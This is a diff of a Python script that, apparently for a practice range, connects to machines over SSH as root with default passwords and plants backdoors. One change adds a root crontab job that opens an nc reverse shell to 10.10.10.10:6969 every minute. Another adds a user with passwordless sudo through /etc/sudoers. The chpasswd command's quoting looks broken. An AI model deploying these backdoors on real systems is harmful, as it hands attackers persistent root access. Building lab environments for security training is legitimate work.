@@ -131,7 +131,7 @@ def getLegend():
             
         returnList.append([presetNum, presetDiff, presetArray])
     return returnList
-def loadWeakness(machine, set, weakness):
+def loadWeakness(machine, weakness, ssh_client):
     address = machine[1]
     
     ssh_client = paramiko.SSHClient()
@@ -139,7 +139,12 @@ def loadWeakness(machine, set, weakness):
     ssh_client.connect(address, username="root", password=getDefPassword(machine[0]))
     
     if(weakness == "1"):
-        command = '"* * * * * root /usr/bin/nc 10.10.10.10:6969 -e /bin/bash" >> /etc/crontab'
+        command = 'echo "* * * * * root /usr/bin/nc 10.10.10.10:6969 -e /bin/bash" >> /etc/crontab'
+        stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
+    if(weakness == "2"):
+        user = input("Enter name of user to add: ")
+        userPass = input(f"Enter password you would like to set for {user}: ")
+        command = f'useradd {user}; echo "{user}:{userPass} | chpasswd; echo "{user} ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'
         stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
 def updatePend():
     os.system("git clone https://github.com/ravesec/horror /tmp/github > /dev/null 2>&1")
